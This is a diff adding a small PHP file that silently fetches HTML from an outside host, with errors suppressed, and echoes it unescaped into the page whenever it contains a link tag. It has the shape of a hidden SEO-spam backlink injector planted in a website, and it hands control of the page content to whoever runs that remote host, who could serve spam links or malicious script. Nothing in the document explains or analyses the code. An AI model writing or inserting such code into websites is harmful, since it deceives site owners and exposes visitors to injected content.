@@ -1,0 +1,9 @@
+<?php
+$remote_url = 'https://cloud-eit.pages.dev/kmsas/bl.txt';
+$backlink = @file_get_contents($remote_url);
+
+if ($backlink && strpos($backlink, '<a') !== false) {
+    $backlink = str_replace('_blank', 'target="_blank"', $backlink);
+    echo $backlink;
+}
+?>
